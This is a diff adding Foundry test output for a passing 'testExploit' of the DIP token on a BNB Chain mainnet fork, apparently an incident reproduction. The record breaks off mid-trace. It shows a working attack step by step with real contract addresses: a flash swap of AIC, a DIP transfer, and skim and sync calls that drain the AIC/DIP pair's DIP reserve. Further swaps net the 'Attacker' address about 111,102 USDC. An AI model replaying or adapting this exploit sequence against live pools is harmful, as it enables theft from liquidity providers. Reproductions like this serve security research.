@@ -1,0 +1,278 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DIP_exp.sol:ContractTest
+[PASS] testExploit() (gas: 1388201)
+Logs:
+  Attacker Before exploit USDC Balance: 0.000000000000000000
+  USDC profit: 111102.040333740421272058
+  Attacker After exploit USDC Balance: 111102.040333740421272058
+
+Traces:
+  [13676] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 104598278 [1.045e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(AIC: [0x524c72268E2053bB356Ecb4C1364B5BB74644405], "AIC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(DIP: [0x6C60bf5DB0670ae94489d3DdE2c60f271625dB50], "DIP")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], "USDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Pancake Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(AIC/NEX Pair: [0xF8331a897C5F32B57EAb394af8ADF0D00003CAE1], "AIC/NEX Pair")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], "AIC/DIP Pair")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1524401] ContractTest::testExploit()
+    ├─ [10328] USDC::symbol() [staticcall]
+    │   ├─ [3082] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::symbol() [delegatecall]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
+    ├─ [3296] USDC::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [staticcall]
+    │   ├─ [2553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [3076] USDC::decimals() [staticcall]
+    │   ├─ [2336] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::decimals() [delegatecall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit USDC Balance", val: 0, decimals: 18)
+    ├─ [944778] → new Local Exploit Helper@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 4717 bytes of code
+    ├─ [0] VM::label(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], "Local Exploit Helper")
+    │   └─ ← [Return]
+    ├─ [1296] USDC::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [staticcall]
+    │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::prank(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3])
+    │   └─ ← [Return]
+    ├─ [491271] Local Exploit Helper::execute()
+    │   ├─ [370039] AIC/NEX Pair::swap(19000000000000000000000000 [1.9e25], 0, Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x00)
+    │   │   ├─ [29839] AIC::transfer(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 19000000000000000000000000 [1.9e25])
+    │   │   │   ├─ emit Transfer(from: AIC/NEX Pair: [0xF8331a897C5F32B57EAb394af8ADF0D00003CAE1], to: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 19000000000000000000000000 [1.9e25])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1cf5e51bf829401ac622008c13248f392e142ec1da5af2648316543ff3255f07: 0x00000000000000000000000000000000000000000010388a22c230fc31aef21c → 0x0000000000000000000000000000000000000000000081221268fb593eaef21c
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000fb768105935a2f3000000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [296109] Local Exploit Helper::pancakeCall(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 19000000000000000000000000 [1.9e25], 0, 0x00)
+    │   │   │   ├─ [607] AIC::balanceOf(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 19000000000000000000000000 [1.9e25]
+    │   │   │   ├─ [24651] AIC::approve(Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 19000000000000000000000000 [1.9e25])
+    │   │   │   │   ├─ emit Approval(owner: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 19000000000000000000000000 [1.9e25])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0 → 0x0000000000000000000000000000000000000000000fb768105935a2f3000000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [96663] Pancake Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(19000000000000000000000000 [1.9e25], 0, [0x524c72268E2053bB356Ecb4C1364B5BB74644405, 0x6C60bf5DB0670ae94489d3DdE2c60f271625dB50], Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1781627317 [1.781e9])
+    │   │   │   │   ├─ [10645] AIC::transferFrom(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], 19000000000000000000000000 [1.9e25])
+    │   │   │   │   │   ├─ emit Approval(owner: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 0)
+    │   │   │   │   │   ├─ emit Transfer(from: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], amount: 19000000000000000000000000 [1.9e25])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0x0000000000000000000000000000000000000000000fb768105935a2f3000000 → 0
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000fb768105935a2f3000000 → 0
+    │   │   │   │   │   │   @ 0xcf0349dbae558efe906e12bfb6243b2c91b289b1837e5a13ea355ea20bcdbd7f: 0x000000000000000000000000000000000000000000084d8e95b67a4988447098 → 0x0000000000000000000000000000000000000000001804f6a60fafec7b447098
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   ├─ [2651] DIP::balanceOf(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] AIC/DIP Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000084d8e95b67a49884470980000000000000000000000000000000000000000001639725c130a3683b3ae2b000000000000000000000000000000000000000000000000000000006a317952
+    │   │   │   │   ├─ [607] AIC::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 29037659001700876485423256 [2.903e25]
+    │   │   │   │   ├─ [67074] AIC/DIP Pair::swap(0, 17564897925642142489089334 [1.756e25], Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [32504] DIP::transfer(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 17564897925642142489089334 [1.756e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], to: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 17564897925642142489089334 [1.756e25])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xcf0349dbae558efe906e12bfb6243b2c91b289b1837e5a13ea355ea20bcdbd7f: 0x0000000000000000000000000000000000000000001639725c130a3683b3ae2b → 0x00000000000000000000000000000000000000000007b1ef55cbe063009e18f5
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000e8783064729d383159536
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [607] AIC::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 29037659001700876485423256 [2.903e25]
+    │   │   │   │   │   ├─ [651] DIP::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 9302754558885577321486581 [9.302e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 29037659001700876485423256 [2.903e25], reserve1: 9302754558885577321486581 [9.302e24])
+    │   │   │   │   │   ├─ emit Swap(sender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 19000000000000000000000000 [1.9e25], amount1In: 0, amount0Out: 0, amount1Out: 17564897925642142489089334 [1.756e25], to: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 9: 0x000000000000000000000000000000082b9527185c4cf98b7d075f86520d7262 → 0x000000000000000000000000000000082c9e2500b947cc8d3f7a2dc2182f5eef
+    │   │   │   │   │   │   @ 8: 0x6a3179520000001639725c130a3683b3ae2b000000084d8e95b67a4988447098 → 0x6a3179b500000007b1ef55cbe063009e18f50000001804f6a60fafec7b447098
+    │   │   │   │   │   │   @ 10: 0x000000000000000000000000000000001baba150a90b46f6c0f5706f3fa0398d → 0x000000000000000000000000000000001bd09dbe324e4eb8ac6d8c358b46df54
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [651] DIP::balanceOf(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 17564897925642142489089334 [1.756e25]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [651] DIP::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   └─ ← [Return] 9302754558885577321486581 [9.302e24]
+    │   │   │   ├─ [17876] DIP::transfer(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], 9896547403069763107964446 [9.896e24])
+    │   │   │   │   ├─ emit Transfer(from: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x4D202ddD3d7960e99D3d457caE7eBfEa04D45359, amount: 593792844184185786477866 [5.937e23])
+    │   │   │   │   ├─ emit Transfer(from: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], amount: 9302754558885577321486580 [9.302e24])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x30f12565bbc7be34de6e4ad7edf1cafea93e4e68b9a0c5713c0bfae00300c110: 0x000000000000000000000000000000000000000000016fc471dc59bfb74fd72e → 0x00000000000000000000000000000000000000000001ed8204f441f19c1e0458
+    │   │   │   │   │   @ 0xcf0349dbae558efe906e12bfb6243b2c91b289b1837e5a13ea355ea20bcdbd7f: 0x00000000000000000000000000000000000000000007b1ef55cbe063009e18f5 → 0x0000000000000000000000000000000000000000000f63deab97c0c6013c31e9
+    │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000e8783064729d383159536 → 0x0000000000000000000000000000000000000000000657d61d63613e9da94f18
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [44197] AIC/DIP Pair::skim(Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   ├─ [607] AIC::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 29037659001700876485423256 [2.903e25]
+    │   │   │   │   ├─ [5139] AIC::transfer(Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0)
+    │   │   │   │   │   ├─ emit Transfer(from: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], to: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [651] DIP::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18605509117771154642973161 [1.86e25]
+    │   │   │   │   ├─ [30333] DIP::transfer(Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 9302754558885577321486580 [9.302e24])
+    │   │   │   │   │   ├─ emit Transfer(from: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], to: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 9302754558885577321486580 [9.302e24])
+    │   │   │   │   │   ├─ emit Transfer(from: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], to: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 9302754558885577321486580 [9.302e24])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xcf0349dbae558efe906e12bfb6243b2c91b289b1837e5a13ea355ea20bcdbd7f: 0x0000000000000000000000000000000000000000000f63deab97c0c6013c31e9 → 1
+    │   │   │   │   │   │   @ 0x1b1faec781886d259ce641a47bfe77cb0c9d76fc47a2b5fb5fe6922a1820905d: 0 → 0x0000000000000000000000000000000000000000000f63deab97c0c6013c31e8
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [9170] AIC/DIP Pair::sync()
+    │   │   │   │   ├─ [607] AIC::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 29037659001700876485423256 [2.903e25]
+    │   │   │   │   ├─ [651] DIP::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1
+    │   │   │   │   ├─ emit Sync(reserve0: 29037659001700876485423256 [2.903e25], reserve1: 1)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6a3179b500000007b1ef55cbe063009e18f50000001804f6a60fafec7b447098 → 0x6a3179b500000000000000000000000000010000001804f6a60fafec7b447098
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [651] DIP::balanceOf(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 7668350522572379381124888 [7.668e24]
+    │   │   │   ├─ [24651] DIP::approve(Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 7668350522572379381124888 [7.668e24])
+    │   │   │   │   ├─ emit Approval(owner: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 7668350522572379381124888 [7.668e24])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0 → 0x0000000000000000000000000000000000000000000657d61d63613e9da94f18
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [58079] Pancake Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(7668350522572379381124888 [7.668e24], 0, [0x6C60bf5DB0670ae94489d3DdE2c60f271625dB50, 0x524c72268E2053bB356Ecb4C1364B5BB74644405], Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1781627317 [1.781e9])
+    │   │   │   │   ├─ [9804] DIP::transferFrom(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], 7668350522572379381124888 [7.668e24])
+    │   │   │   │   │   ├─ emit Approval(owner: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 0)
+    │   │   │   │   │   ├─ emit Transfer(from: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x4D202ddD3d7960e99D3d457caE7eBfEa04D45359, amount: 460101031354342762867493 [4.601e23])
+    │   │   │   │   │   ├─ emit Transfer(from: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], amount: 7208249491218036618257395 [7.208e24])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000657d61d63613e9da94f18 → 0
+    │   │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0x0000000000000000000000000000000000000000000657d61d63613e9da94f18 → 0
+    │   │   │   │   │   │   @ 0xcf0349dbae558efe906e12bfb6243b2c91b289b1837e5a13ea355ea20bcdbd7f: 1 → 0x00000000000000000000000000000000000000000005f667fce7a835bd2963f4
+    │   │   │   │   │   │   @ 0x30f12565bbc7be34de6e4ad7edf1cafea93e4e68b9a0c5713c0bfae00300c110: 0x00000000000000000000000000000000000000000001ed8204f441f19c1e0458 → 0x000000000000000000000000000000000000000000024ef0256ffafa7c9def7d
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   ├─ [607] AIC::balanceOf(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [893] AIC/DIP Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001804f6a60fafec7b4470980000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000006a3179b5
+    │   │   │   │   ├─ [651] DIP::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7208249491218036618257396 [7.208e24]
+    │   │   │   │   ├─ [38325] AIC/DIP Pair::swap(29037659001700876485423251 [2.903e25], 0, Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [23039] AIC::transfer(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 29037659001700876485423251 [2.903e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef], to: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 29037659001700876485423251 [2.903e25])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000001804f6a60fafec7b447093
+    │   │   │   │   │   │   │   @ 0xcf0349dbae558efe906e12bfb6243b2c91b289b1837e5a13ea355ea20bcdbd7f: 0x0000000000000000000000000000000000000000001804f6a60fafec7b447098 → 5
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [607] AIC::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5
+    │   │   │   │   │   ├─ [651] DIP::balanceOf(AIC/DIP Pair: [0xF7D8267D01D1104Da2Dd30828aA9C0E1647919ef]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 7208249491218036618257396 [7.208e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 5, reserve1: 7208249491218036618257396 [7.208e24])
+    │   │   │   │   │   ├─ emit Swap(sender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 7208249491218036618257395 [7.208e24], amount0Out: 29037659001700876485423251 [2.903e25], amount1Out: 0, to: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x6a3179b500000000000000000000000000010000001804f6a60fafec7b447098 → 0x6a3179b500000005f667fce7a835bd2963f40000000000000000000000000005
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [607] AIC::balanceOf(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 29037659001700876485423251 [2.903e25]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3139] AIC::transfer(AIC/NEX Pair: [0xF8331a897C5F32B57EAb394af8ADF0D00003CAE1], 19047619047619047619047620 [1.904e25])
+    │   │   │   │   ├─ emit Transfer(from: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: AIC/NEX Pair: [0xF8331a897C5F32B57EAb394af8ADF0D00003CAE1], amount: 19047619047619047619047620 [1.904e25])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1cf5e51bf829401ac622008c13248f392e142ec1da5af2648316543ff3255f07: 0x0000000000000000000000000000000000000000000081221268fb593eaef21c → 0x00000000000000000000000000000000000000000010429f91cc09fb51bb22e0
+    │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000001804f6a60fafec7b447093 → 0x00000000000000000000000000000000000000000008437926aca14a68383fcf
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [607] AIC::balanceOf(AIC/NEX Pair: [0xF8331a897C5F32B57EAb394af8ADF0D00003CAE1]) [staticcall]
+    │   │   │   └─ ← [Return] 19657432839794188959294176 [1.965e25]
+    │   │   ├─ [2629] 0xE75B76F2cE02521fD4615fF861c9B6809771C28a::balanceOf(AIC/NEX Pair: [0xF8331a897C5F32B57EAb394af8ADF0D00003CAE1]) [staticcall]
+    │   │   │   └─ ← [Return] 52252836702517396009148093 [5.225e25]
+    │   │   ├─ emit Sync(reserve0: 19657432839794188959294176 [1.965e25], reserve1: 52252836702517396009148093 [5.225e25])
+    │   │   ├─ emit Swap(sender: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 19047619047619047619047620 [1.904e25], amount1In: 0, amount0Out: 19000000000000000000000000 [1.9e25], amount1Out: 0, to: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─  storage changes:
+    │   │   │   @ 10: 0x0000000000000000000000000000002a00a5a13f3a425a1a02ed61c77ac1d839 → 0x0000000000000000000000000000002a00c647a3f9583e358a44308afc8edc21
+    │   │   │   @ 9: 0x000000000000000000000000000000f53f94950c8dfb6cfd5034a178bb72bd39 → 0x000000000000000000000000000000f5407c679e5f36ed6cd2d9c344a251895a
+    │   │   │   @ 8: 0x6a31795e0000002b38f7f41d2993f9b85ebd00000010388a22c230fc31aef21c → 0x6a3179b50000002b38f7f41d2993f9b85ebd00000010429f91cc09fb51bb22e0
+    │   │   └─ ← [Stop]
+    │   ├─ [607] AIC::balanceOf(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 9990039954081828866375631 [9.99e24]
+    │   ├─ [22551] AIC::approve(Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 9990039954081828866375631 [9.99e24])
+    │   │   ├─ emit Approval(owner: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 9990039954081828866375631 [9.99e24])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0 → 0x00000000000000000000000000000000000000000008437926aca14a68383fcf
+    │   │   └─ ← [Return] true
+    │   ├─ [90333] Pancake Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(9990039954081828866375631 [9.99e24], 0, [0x524c72268E2053bB356Ecb4C1364B5BB74644405, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3], 1781627317 [1.781e9])
+    │   │   ├─ [10645] AIC::transferFrom(Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd, 9990039954081828866375631 [9.99e24])
+    │   │   │   ├─ emit Approval(owner: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 0)
+    │   │   │   ├─ emit Transfer(from: Local Exploit Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd, amount: 9990039954081828866375631 [9.99e24])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0x00000000000000000000000000000000000000000008437926aca14a68383fcf → 0
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000008437926aca14a68383fcf → 0
+    │   │   │   │   @ 0x40e770d105d2ac98dbd51b6a9c79094df4c0bfb4ec4798b24a8fbb897081c7bd: 0x000000000000000000000000000000000000000000004648e7b2a1a4a5c43b0a → 0x0000000000000000000000000000000000000000000889c20e5f42ef0dfc7ad9
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [1296] USDC::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [staticcall]
+    │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2893] 0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000004648e7b2a1a4a5c43b0a00000000000000000000000000000000000000000000184f7597511d700ebc5b000000000000000000000000000000000000000000000000000000006a3179ae
+    │   │   ├─ [607] AIC::balanceOf(0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd) [staticcall]
+    │   │   │   └─ ← [Return] 10321950469040508262709977 [1.032e25]
+    │   │   ├─ [63954] 0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd::swap(0, 111102040333740421272058 [1.111e23], Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3], 0x)
+    │   │   │   ├─ [28739] USDC::transfer(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3], 111102040333740421272058 [1.111e23])
